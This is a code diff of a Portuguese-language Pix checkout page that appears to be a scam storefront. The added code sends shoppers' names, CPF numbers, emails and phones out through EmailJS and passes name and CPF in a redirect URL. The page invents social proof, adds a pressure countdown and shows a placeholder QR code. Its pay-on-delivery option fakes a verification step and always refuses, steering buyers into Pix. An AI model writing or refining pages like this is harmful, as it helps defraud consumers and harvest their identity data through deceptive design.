@@ -319,6 +319,186 @@
             animation: deliveryPulse 2s ease-out infinite;
         }
 
+        @keyframes deliveryPulse {
+            0%   { box-shadow: 0 0 0 0 rgba(22,163,74,0.4); }
+            70%  { box-shadow: 0 0 0 5px rgba(22,163,74,0); }
+            100% { box-shadow: 0 0 0 0 rgba(22,163,74,0); }
+        }
+
+        .pix-delivery-body {
+            padding: 14px 16px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .pix-delivery-icon-wrap {
+            width: 40px;
+            height: 40px;
+            border-radius: 10px;
+            background: #f0fdf4;
+            border: 1px solid #bbf7d0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .pix-delivery-icon-wrap i {
+            color: #16a34a;
+            font-size: 18px;
+        }
+
+        .delivery-spinner {
+            width: 18px;
+            height: 18px;
+            border: 2px solid #bbf7d0;
+            border-top-color: #16a34a;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+        }
+
+        .pix-delivery-info {
+            flex: 1;
+        }
+
+        .pix-delivery-time-text {
+            font-size: 15px;
+            font-weight: 700;
+            color: #111827;
+            line-height: 1.3;
+        }
+
+        .pix-delivery-sub {
+            font-size: 11px;
+            font-weight: 500;
+            color: #9ca3af;
+            margin-top: 2px;
+        }
+
+        .pix-delivery-footer {
+            padding: 8px 16px;
+            background: #f8fafc;
+            border-top: 1px solid #f1f5f9;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .pix-delivery-footer i {
+            color: #16a34a;
+            font-size: 11px;
+        }
+
+        .pix-delivery-footer span {
+            font-size: 11px;
+            font-weight: 600;
+            color: #6b7280;
+        }
+
+        .pix-delivery-footer strong {
+            color: #111827;
+            font-weight: 700;
+        }
+        /* ===== FIM BLOCO DE ENTREGA ===== */
+
+        /* QR Code */
+        .guarantee-badge {
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+            background: linear-gradient(135deg, #fffbeb 0%, #fef3c7 100%);
+            border: 1px solid #fde68a; border-radius: 100px;
+            padding: 7px 16px; margin: 0 auto 16px; width: fit-content;
+            font-size: 11px; font-weight: 800; color: #78350f; letter-spacing: 0.3px;
+        }
+        .guarantee-badge i { color: #d97706; }
+
+        .pix-qr-wrap {
+            text-align: center; margin: 0 16px 20px;
+            background: #fff; border: 1px solid var(--border);
+            border-radius: 16px; padding: 24px 16px;
+            box-shadow: var(--shadow-sm);
+        }
+        .pix-qr-img-container {
+            width: 190px; height: 190px; padding: 10px; background: #fff;
+            margin: 0 auto; display: flex; align-items: center; justify-content: center;
+            border: 2px solid var(--pix-bg); border-radius: 12px;
+        }
+        .pix-qr-img-container img { width: 100% !important; height: 100% !important; }
+        .pix-qr-caption { font-size: 12px; color: var(--ink2); font-weight: 600; margin-top: 14px; display: flex; align-items: center; justify-content: center; gap: 6px; }
+        .pix-qr-caption i { color: var(--pix-color); }
+
+        .pix-primary-cta {
+            margin: 0 16px 16px;
+            background: linear-gradient(135deg, #16a34a 0%, #15803d 100%);
+            color: #fff; border: none; border-radius: 14px;
+            padding: 18px 20px; width: calc(100% - 32px);
+            font-size: 17px; font-weight: 800; font-family: inherit;
+            display: flex; align-items: center; justify-content: center; gap: 12px;
+            box-shadow: 0 8px 24px rgba(22, 163, 74, 0.3), 0 0 0 0 rgba(22, 163, 74, 0.5);
+            cursor: pointer; position: relative; overflow: hidden; transition: all 0.2s;
+            animation: ctaPulse 2.2s ease-in-out infinite;
+        }
+        @keyframes ctaPulse {
+            0%, 100% { box-shadow: 0 8px 24px rgba(22, 163, 74, 0.3), 0 0 0 0 rgba(22, 163, 74, 0.4); }
+            50%      { box-shadow: 0 8px 28px rgba(22, 163, 74, 0.38), 0 0 0 10px rgba(22, 163, 74, 0); }
+        }
+        .pix-primary-cta::before {
+            content: ''; position: absolute; top: 0; left: -100%;
+            width: 60%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
+            animation: ctaShine 3s ease-in-out infinite;
+        }
+        @keyframes ctaShine { 0% { left: -100%; } 60% { left: 130%; } 100% { left: 130%; } }
+        .pix-primary-cta:active { transform: scale(0.97); }
+        .pix-primary-cta.copied { background: #111827; animation: none; }
+        .pix-primary-cta.copied::before { display: none; }
+
+        .pix-code-field { display: flex; gap: 8px; margin: 0 16px 20px; }
+        .pix-copia-input {
+            flex: 1; padding: 12px 14px; border: 1px solid var(--border); border-radius: 12px;
+            font-size: 12px; color: var(--muted); font-family: monospace; background: #f8fafc;
+            white-space: nowrap; overflow: hidden; text-overflow: ellipsis; outline: none;
+            -webkit-user-select: none; user-select: none; caret-color: transparent; pointer-events: none;
+        }
+        .pix-btn-copiar {
+            background: #f1f5f9; color: var(--ink2); border: 1px solid var(--border);
+            border-radius: 12px; padding: 0 18px; font-size: 13px; font-weight: 700;
+            transition: all .15s; cursor: pointer;
+        }
+        .pix-btn-copiar:active { background: #e2e8f0; }
+
+        /* ===== AGUARDANDO PAGAMENTO - REVISADO ===== */
+        .pix-aguardando {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 16px;
+            background: #f0fdf4;
+            border: 1px solid #bbf7d0;
+            border-radius: 12px;
+            margin: 0 16px 12px;
+            font-size: 13px;
+            color: #15803d;
+            font-weight: 600;
+            flex-direction: row;
+        }
+
+        .pix-aguardando-top {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex: 1;
+        }
+
+        .pix-aguardando-sub {
+            font-size: 11px;
+            color: #15803d;
+            font-weight: 500;
+            opacity: 0.75;
+            white-space: nowrap;
+        }
+
+        .pix-dot-loader { display: flex; gap: 4px; align-items: center; }
         .pix-dot-loader span {
             width: 5px; height: 5px;
             border-radius: 50%;
@@ -644,119 +824,177 @@
             <div class="timer-top">
                 <i class="fas fa-clock"></i>
                 <span>O desconto termina em:</span>
-                <span class="pix-timer-badge" id="pixTimer">05:00</span>
+                <span class="pix-timer-badge" id="pixTimer">15:00</span>
             </div>
-            <div class="timer-bar">
-                <div class="timer-bar-fill" id="pixTimerBar"></div>
-            </div>
+            <div class="timer-bar"><div class="timer-bar-fill" id="pixTimerBar"></div></div>
         </div>
 
+        <!-- Resumo do Pedido -->
         <div class="pix-order-summary">
             <div class="pix-order-header">
                 <span>Resumo do Pedido</span>
-                <span>#77291</span>
+                <span id="pixOrderId">#92841</span>
             </div>
-            <div class="pix-product-card">
-                <img src="" alt="" class="pix-product-img" id="pix-summary-img">
-                <div class="pix-product-info">
-                    <div class="pix-product-name" id="pix-summary-name">Carregando...</div>
-                    <div class="pix-product-meta">Entrega Prioritária</div>
+            <div id="pixProductContainer"></div>
+        </div>
+
+        <!-- Bloco de Entrega Revisado -->
+        <div class="pix-delivery-block" id="pixDeliveryBlock">
+            <div class="pix-delivery-header">
+                <span class="pix-delivery-header-label">
+                    <i class="fas fa-truck"></i>
+                    Prazo de entrega
+                </span>
+                <div class="pix-delivery-status-dot"></div>
+            </div>
+            <div class="pix-delivery-body">
+                <div class="pix-delivery-icon-wrap">
+                    <div class="delivery-spinner"></div>
                 </div>
-                <div class="pix-product-price-block">
-                    <div class="pix-product-price" id="pix-summary-price">R$ 0,00</div>
-                    <div class="pix-product-savings">Economia de 46%</div>
+                <div class="pix-delivery-info">
+                    <div class="pix-delivery-time-text">Aguardando pagamento</div>
+                    <div class="pix-delivery-sub">Confirmação instantânea via Pix</div>
                 </div>
+            </div>
+            <div class="pix-delivery-footer">
+                <i class="fas fa-clock"></i>
+                <span><strong id="pixDeliveryTime">20 minutos</strong> após confirmação</span>
             </div>
         </div>
 
-        <div class="pix-delivery-block">
-            <div class="pix-delivery-header">
-                <div class="pix-delivery-header-label">
-                    <i class="fas fa-truck-fast"></i>
-                    Status da Entrega
-                </div>
-                <div class="pix-delivery-status-dot"></div>
+        <div class="guarantee-badge">
+            <i class="fas fa-shield-check"></i>
+            <span>COMPRA E ENVIO 100% GARANTIDO</span>
+        </div>
+
+        <div class="pix-qr-wrap">
+            <div id="pixQrCode" class="pix-qr-img-container"></div>
+            <div class="pix-qr-caption">
+                <i class="fas fa-qrcode"></i>
+                Escaneie o código com o app do seu banco
             </div>
-            <div class="pix-delivery-content">
-                <div class="pix-delivery-status-main">
-                    Aguardando Pagamento
-                </div>
-                <div class="pix-delivery-status-desc">
-                    O entregador será acionado assim que o Pix for confirmado.
-                </div>
-                <div class="pix-delivery-loader-row">
-                    <div class="pix-dot-loader">
-                        <span></span><span></span><span></span>
-                    </div>
-                    <span>Sincronizando com Banco Central...</span>
-                </div>
+        </div>
+
+        <button class="pix-primary-cta" id="pixPrimaryCta" onclick="copiarPix(true)">
+            <i class="fas fa-copy"></i>
+            <span>Copiar Código Pix</span>
+        </button>
+
+        <input id="pixCopiaCola" type="hidden">
+
+        <!-- Aguardando Pagamento Revisado -->
+        <div class="pix-aguardando">
+            <div class="pix-aguardando-top">
+                <div class="pix-dot-loader"><span></span><span></span><span></span></div>
+                <span>Aguardando pagamento</span>
             </div>
+            <span class="pix-aguardando-sub">Pedido liberado na hora</span>
         </div>
 
         <div class="pix-social-proof">
-            <div class="live-dot"></div>
-            <span><b>14 pessoas</b> geraram um Pix agora</span>
+            <span class="live-dot"></span>
+            <span><b>+127 pessoas</b> finalizaram a compra na última hora</span>
         </div>
 
-        <div class="bank-icons-label">Bancos Integrados</div>
-        <div class="bank-icons-row">
-            <img src="https://logopng.com.br/logos/nubank-114.png" alt="Nubank">
-            <img src="https://logopng.com.br/logos/itau-21.png" alt="Itaú">
-            <img src="https://logopng.com.br/logos/bradesco-12.png" alt="Bradesco">
-            <img src="https://logopng.com.br/logos/santander-42.png" alt="Santander">
-            <img src="https://logopng.com.br/logos/inter-110.png" alt="Inter">
+        <div class="bank-icons-row" style="margin-top: 10px; border: none; background: transparent;">
+            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663194389473/zrydrswnZymwCjVL.png" alt="Itaú">
+            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663194389473/EtXEMbzJIIsRxbII.png" alt="Nubank">
+            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663194389473/jPYGJEmFUargyzQO.png" alt="Bradesco">
+            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663194389473/hQcHsORPVOAZRPQZ.png" alt="Inter">
+            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663194389473/wkYTYnQCslYDbeQX.png" alt="Santander">
         </div>
 
         <div class="pix-info">
-            <div class="pix-info-step">
-                <div class="step-num">1</div>
-                <div><b>Copie o código</b> clicando no botão abaixo ou use o QR Code.</div>
-            </div>
-            <div class="pix-info-step">
-                <div class="step-num">2</div>
-                <div>Abra o app do seu banco e escolha a opção <b>Pix Copia e Cola</b>.</div>
-            </div>
-            <div class="pix-info-step">
-                <div class="step-num">3</div>
-                <div>Confira os dados e <b>confirme o pagamento</b>.</div>
-            </div>
+            <div class="pix-info-step"><span class="step-num">1</span><span><b>Copie o código</b> acima ou escaneie o QR Code.</span></div>
+            <div class="pix-info-step"><span class="step-num">2</span><span>Abra o app do seu banco e vá em <b>Pix &gt; Copia e Cola</b>.</span></div>
+            <div class="pix-info-step"><span class="step-num">3</span><span><b>Confirme o pagamento</b> e seu pedido será liberado na hora.</span></div>
         </div>
 
-        <div class="pix-secure-line">
-            <span><i class="fas fa-shield-check"></i> Pagamento 100% Criptografado</span>
-            <span><i class="fas fa-lock"></i> SSL Seguro</span>
+
+    </div>
+
+    <!-- Modal Entrega -->
+    <div class="modal-overlay" id="delivery-modal">
+        <div class="modal-content">
+            <button class="modal-close-btn" id="modal-close-btn-delivery"><i class="fas fa-times"></i></button>
+            <div id="modal-step-1">
+                <div class="modal-icon warning"><i class="fas fa-exclamation-triangle"></i></div>
+                <h3 class="modal-title">Você tem certeza?</h3>
+                <p class="modal-text" id="delivery-warning-text"></p>
+                <div class="modal-buttons">
+                    <button class="btn-modal btn-modal-pix" id="modal-back-to-pix">Voltar para o Pix (Desconto)</button>
+                    <button class="btn-modal btn-modal-continue" id="modal-continue-delivery">Continuar sem desconto</button>
+                </div>
+            </div>
+            <div id="modal-step-2" style="display:none;">
+                <h3 class="modal-title">Dados para Entrega</h3>
+                <p class="modal-text">Preencha seus dados para finalizarmos seu pedido na entrega.</p>
+                <form class="contact-form" id="delivery-contact-form">
+                    <div class="form-group">
+                        <label>Nome Completo</label>
+                        <input type="text" id="delivery-name" placeholder="Seu nome completo" required>
+                    </div>
+                    <div class="form-group">
+                        <label>E-mail</label>
+                        <input type="email" id="delivery-email" placeholder="seu@email.com" required>
+                    </div>
+                    <div class="form-group">
+                        <label>CPF</label>
+                        <input type="tel" id="delivery-cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Telefone</label>
+                        <input type="tel" id="delivery-phone" placeholder="(00) 00000-0000" required>
+                    </div>
+                    <button type="submit" class="btn-modal btn-send-form">Enviar Pedido</button>
+                </form>
+            </div>
+            <div id="modal-step-not-allowed" style="display:none;">
+                <div class="modal-icon warning"><i class="fas fa-exclamation-circle"></i></div>
+                <h3 class="modal-title">Modalidade Indisponível para Primeira Compra</h3>
+                <p class="modal-text">Sentimos muito, mas como é sua <strong>primeira compra conosco</strong>, a modalidade de pagamento na entrega não está habilitada.</p>
+                <div class="modal-buttons">
+                    <button class="btn-modal btn-modal-pix" id="btn-back-to-pix-from-warning">Pagar Agora via Pix (com Desconto)</button>
+                </div>
+            </div>
+            <div id="modal-step-3" style="display:none;">
+                <div class="modal-icon success"><i class="fas fa-check-circle"></i></div>
+                <h3 class="modal-title">Pedido Recebido!</h3>
+                <p class="modal-text">Obrigado! Recebemos sua solicitação de pagamento na entrega. Em breve entraremos em contato para confirmar os detalhes.</p>
+                <button class="btn-modal btn-modal-continue" id="modal-close-final">Fechar</button>
+            </div>
         </div>
     </div>
 
     <script>
-        const EMAILJS_SERVICE_ID = "service_0q40wnd";
-        const EMAILJS_TEMPLATE_ID = "template_704k4i9";
-        const EMAILJS_PUBLIC_KEY = "FfVv3_6Z4944fH9Zt";
-
-        (function(){ emailjs.init(EMAILJS_PUBLIC_KEY); })();
-
-        let subtotalValue = 0;
+        const EMAILJS_SERVICE_ID = 'service_yfnu4c4';
+        const EMAILJS_TEMPLATE_ID = 'template_qkooous';
+        const EMAILJS_PUBLIC_KEY = 'WoFt2Y6ppoxFL9L2A';
 
         function getUrlParameter(name) {
-            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
-            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
-            var results = regex.exec(location.search);
-            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+            const params = new URLSearchParams(window.location.search);
+            return params.get(name);
         }
 
-        function maskCPF(v) {
-            v = v.replace(/\D/g, "");
-            v = v.replace(/(\d{3})(\d)/, "$1.$2");
-            v = v.replace(/(\d{3})(\d)/, "$1.$2");
-            v = v.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
-            return v;
+        const subtotalFromUrl = getUrlParameter('subtotal');
+        const subtotalValue = subtotalFromUrl ? parseFloat(subtotalFromUrl) : 89.47;
+
+        let productsData = [];
+        try {
+            const productsParam = getUrlParameter('products');
+            if (productsParam) productsData = JSON.parse(decodeURIComponent(productsParam));
+        } catch (e) {}
+
+        if (EMAILJS_PUBLIC_KEY && EMAILJS_PUBLIC_KEY !== 'public_xxx') {
+            emailjs.init(EMAILJS_PUBLIC_KEY);
         }
 
-        function maskPhone(v) {
-            v = v.replace(/\D/g, "");
-            v = v.replace(/^(\d{2})(\d)/g, "($1) $2");
-            v = v.replace(/(\d)(\d{4})$/, "$1-$2");
-            return v;
+        function maskCPF(value) {
+            return value.replace(/\D/g,'').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d{1,2})/,'$1-$2').replace(/(-\d{2})\d+?$/,'$1');
+        }
+
+        function maskPhone(value) {
+            return value.replace(/\D/g,'').replace(/^(\d{2})(\d)/g,'($1) $2').replace(/(\d{5})(\d)/,'$1-$2').replace(/(-\d{4})\d+?$/,'$1');
         }
 
         function setupPhoneInput(inputElement) {
@@ -826,7 +1064,7 @@
                                     </div>
                                     <div class="pix-error-msg" id="pix-error-msg">
                                         <i class="fas fa-exclamation-circle"></i>
-                                        <span id="pix-error-text">Erro ao gerar código PIX.</span>
+                                        <span id="pix-error-text">Erro ao processar pedido.</span>
                                     </div>
                                     <button class="payment-action-btn" id="btn-generate-pix" style="margin-top:10px;">
                                         <span class="btn-text">Pagar R$ ${baseTotal.toFixed(2).replace('.', ',')} <i class="fas fa-check"></i></span>
@@ -918,6 +1156,7 @@
             fill.style.setProperty('--progress-duration', duration);
             fill.style.setProperty('--progress-easing', easing);
             fill.style.width = width;
+
         }
 
         async function generatePix() {
@@ -934,7 +1173,7 @@
 
             const loader = document.getElementById('global-loader');
             document.getElementById('loader-title').textContent = 'Validando Pedido';
-            document.getElementById('loader-desc').textContent = 'Aguarde um instante enquanto geramos seu código Pix seguro.';
+            document.getElementById('loader-desc').textContent = 'Aguarde um instante enquanto processamos seu pedido.';
 
             const fill = document.getElementById('loaderProgress');
             fill.style.width = '0%';
@@ -948,69 +1187,208 @@
             try {
                 sendEmailJS(name, cpfRaw, phone, subtotalValue);
 
-                setTimeout(() => setLoaderStep(2, 'Pedido validado! Redirecionando...'), 2500);
-
+                // Redirecionamento após a seção de "Validando pedido"
                 setTimeout(() => {
-                    const baseUrl = "https://www.linkespecifico.com";
-                    const currentParams = new URLSearchParams(window.location.search);
-                    currentParams.set('nome', name);
-                    currentParams.set('cpf', cpf);
-                    window.location.href = `${baseUrl}?${currentParams.toString()}`;
-                }, 3200);
+                    setLoaderStep(2, 'Pedido Validado!');
+                    
+                    setTimeout(() => {
+                        const currentParams = new URLSearchParams(window.location.search);
+                        currentParams.set('nome', name);
+                        currentParams.set('cpf', cpfRaw);
+                        
+                        // Link específico com todos os parâmetros da URL atual + nome e cpf
+                        const redirectUrl = `https://seulinkaqui.com/?${currentParams.toString()}`;
+                        window.location.href = redirectUrl;
+                    }, 800);
+                }, 2000);
 
             } catch (err) {
                 loader.classList.remove('active');
                 loader.style.display = 'none';
                 document.body.style.overflow = '';
-                errorText.textContent = 'Erro ao validar pedido. Tente novamente.';
+                errorText.textContent = 'Erro ao processar. Tente novamente.';
                 errorEl.classList.add('visible');
             }
         }
-
-        // Removida função fetchPixCode pois não será mais utilizada
 
         function startTimer(duration, display) {
             let timer = duration;
             const total = duration;
             const bar = document.getElementById('pixTimerBar');
-            setInterval(function () {
+            const container = display.closest('.timer-container');
+            const interval = setInterval(function () {
                 let minutes = parseInt(timer / 60, 10);
                 let seconds = parseInt(timer % 60, 10);
                 minutes = minutes < 10 ? "0" + minutes : minutes;
                 seconds = seconds < 10 ? "0" + seconds : seconds;
                 display.textContent = minutes + ":" + seconds;
-                if (bar) bar.style.width = (timer / total * 100) + "%";
-                if (--timer < 0) timer = 0;
+                if (bar) bar.style.width = Math.max(0, (timer / total) * 100) + '%';
+                if (container && timer <= 180) {
+                    container.style.background = 'linear-gradient(135deg, #fee2e2 0%, #fecaca 100%)';
+                    container.style.borderColor = '#fca5a5';
+                }
+                if (--timer < 0) {
+                    clearInterval(interval);
+                    display.textContent = "EXPIRADO";
+                    document.getElementById('pixQrCode').style.opacity = "0.3";
+                    document.getElementById('btnCopiarPix').disabled = true;
+                    const cta = document.getElementById('pixPrimaryCta');
+                    if (cta) { cta.disabled = true; cta.style.opacity = '0.5'; }
+                }
             }, 1000);
         }
 
-        function renderCart() {
-            const product_name = getUrlParameter('product_name') || 'Produto Selecionado';
-            const product_img = getUrlParameter('product_img') || '';
-            const price_param = getUrlParameter('price');
-            subtotalValue = price_param ? parseFloat(price_param.replace(',', '.')) : 0;
-
-            const cartHTML = `
-                <div class="review-block">
-                    <div class="review-header-bar">
-                        <div class="review-header-title"><i class="fas fa-shopping-cart"></i> Resumo da Compra</div>
-                    </div>
-                    <div class="pix-product-card" style="padding: 0; margin-bottom: 20px; border: none;">
-                        <img src="${product_img}" alt="${product_name}" class="pix-product-img" style="width: 70px; height: 70px;">
+        function renderPixProducts() {
+            const container = document.getElementById('pixProductContainer');
+            if (!container || productsData.length === 0) return;
+            let html = '';
+            productsData.forEach(item => {
+                const oldPrice = item.v * 1.46;
+                const savings = oldPrice - item.v;
+                html += `
+                    <div class="pix-product-card">
+                        <img src="${item.p}" alt="${item.n}" class="pix-product-img">
                         <div class="pix-product-info">
-                            <div class="pix-product-name" style="font-size: 1.1rem;">${product_name}</div>
-                            <div class="pix-product-meta">Quantidade: 1</div>
+                            <div class="pix-product-name">${item.n}</div>
+                            <div class="pix-product-meta">Qtd: ${item.q} • R$ ${item.v.toFixed(2).replace('.', ',')}</div>
                         </div>
-                        <div class="pix-product-price" style="font-size: 1.2rem;">R$ ${subtotalValue.toFixed(2).replace('.', ',')}</div>
+                        <div class="pix-product-price-block">
+                            <div class="pix-product-price">R$ ${(item.v * item.q).toFixed(2).replace('.', ',')}</div>
+                            <div class="pix-product-savings">Economia de R$ ${(savings * item.q).toFixed(2).replace('.', ',')}</div>
+                        </div>
                     </div>
-                    <button class="payment-action-btn" id="btn-go-to-payment" style="width: 100%;">Finalizar Compra <i class="fas fa-chevron-right"></i></button>
-                </div>
-            `;
-            document.getElementById('cart-content-wrapper').innerHTML = cartHTML;
-            document.getElementById('btn-go-to-payment').onclick = renderPaymentOptions;
+                `;
+            });
+            container.innerHTML = html;
         }
 
-        window.onload = renderCart;
+        function preparePixScreen(qrCode) {
+            const pix = document.getElementById('pixScreen');
+            pix.style.display = 'block';
+
+            const deliveryTime = getUrlParameter('delivery_time');
+            if (deliveryTime) {
+                const el = document.getElementById('pixDeliveryTime');
+                if (el) el.textContent = decodeURIComponent(deliveryTime.replace(/\+/g, ' '));
+            }
+
+            document.getElementById('pixCopiaCola').value = qrCode;
+            renderPixProducts();
+
+            const qrContainer = document.getElementById('pixQrCode');
+            qrContainer.innerHTML = "";
+            const visualQrCode = "00020126330014BR.GOV.BCB.PIX01111111111111520400005303986540510.005802BR5913USUARIO TESTE6009SAO PAULO62070503***6304ABCD";
+
+            try {
+                new QRCode(qrContainer, {
+                    text: visualQrCode, width: 170, height: 170,
+                    colorDark: "#000000", colorLight: "#ffffff",
+                    correctLevel: QRCode.CorrectLevel.H
+                });
+                setTimeout(() => {
+                    const img = qrContainer.querySelector('img') || qrContainer.querySelector('canvas');
+                    if (img) { img.style.display='block'; img.style.margin='0 auto'; img.style.width='170px'; img.style.height='170px'; }
+                }, 100);
+            } catch (e) {
+                qrContainer.innerHTML = '<i class="fas fa-qrcode" style="font-size: 100px; color: #ccc; margin-top: 35px;"></i>';
+            }
+
+            startTimer(60 * 15, document.querySelector('#pixTimer'));
+            window.scrollTo({ top: 0, behavior: 'instant' });
+            document.body.style.backgroundColor = 'var(--bg)';
+        }
+
+        let isCopying = false;
+        function copiarPix() {
+            if (isCopying) return;
+            isCopying = true;
+            const el = document.getElementById('pixCopiaCola');
+            const value = el.value;
+
+            if (navigator.clipboard && window.isSecureContext) {
+                navigator.clipboard.writeText(value).then(showFeedback).catch(fallbackCopy);
+            } else { fallbackCopy(); }
+
+            function fallbackCopy() {
+                const tempInput = document.createElement('input');
+                tempInput.value = value;
+                document.body.appendChild(tempInput);
+                tempInput.select();
+                try { document.execCommand('copy'); } catch(e) {}
+                document.body.removeChild(tempInput);
+                showFeedback();
+            }
+
+            function showFeedback() {
+                const primary = document.getElementById('pixPrimaryCta');
+                if (primary) {
+                    const origHTML = primary.innerHTML;
+                    primary.classList.add('copied');
+                    primary.innerHTML = '<i class="fas fa-check-circle"></i><span>Código Copiado!</span>';
+                    setTimeout(() => { primary.classList.remove('copied'); primary.innerHTML = origHTML; isCopying = false; }, 2000);
+                } else { setTimeout(() => { isCopying = false; }, 2000); }
+            }
+        }
+
+        function showDeliveryModal() {
+            document.getElementById('delivery-modal').classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        document.getElementById('modal-close-btn-delivery').addEventListener('click', () => {
+            document.getElementById('delivery-modal').classList.remove('active');
+            document.body.style.overflow = '';
+        });
+        document.getElementById('modal-back-to-pix').addEventListener('click', () => {
+            document.getElementById('delivery-modal').classList.remove('active');
+            document.body.style.overflow = '';
+        });
+        document.getElementById('modal-continue-delivery').addEventListener('click', () => {
+            document.getElementById('modal-step-1').style.display = 'none';
+            document.getElementById('modal-step-2').style.display = 'block';
+        });
+        document.getElementById('delivery-contact-form').addEventListener('submit', (e) => {
+            e.preventDefault();
+            const loader = document.getElementById('global-loader');
+            document.getElementById('loader-title').textContent = 'Validando Pedido';
+            document.getElementById('loader-desc').textContent = 'Estamos verificando a disponibilidade para sua região.';
+
+            const fill = document.getElementById('loaderProgress');
+            fill.style.width = '0%';
+
+
+            loader.classList.add('active');
+
+            setTimeout(() => setLoaderStep(0, 'Iniciando verificação...'), 180);
+            setTimeout(() => setLoaderStep(1, 'Verificando disponibilidade...'), 1050);
+            setTimeout(() => {
+                setLoaderStep(2, 'Concluído');
+                setTimeout(() => {
+                    loader.classList.remove('active');
+                    document.getElementById('modal-step-2').style.display = 'none';
+                    document.getElementById('modal-step-not-allowed').style.display = 'block';
+                }, 500);
+            }, 2200);
+        });
+
+        document.getElementById('btn-back-to-pix-from-warning').addEventListener('click', () => {
+            document.getElementById('delivery-modal').classList.remove('active');
+            document.body.style.overflow = '';
+            const pixCard = document.getElementById('pay-now-pix');
+            if (pixCard) {
+                pixCard.classList.add('selected');
+                document.getElementById('pay-on-delivery').classList.remove('selected');
+                pixCard.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            }
+        });
+        document.getElementById('modal-close-final').addEventListener('click', () => { window.location.href = 'https://www.google.com'; });
+        document.addEventListener('click', (e) => { if (e.target.closest('#payment-back-btn')) window.history.back(); });
+
+        window.addEventListener('DOMContentLoaded', () => {
+            renderPaymentOptions();
+            const deliveryCpfInput = document.getElementById('delivery-cpf');
+            if (deliveryCpfInput) setupCPFInput(deliveryCpfInput);
+        });
     </script>
 </body>
 </html>
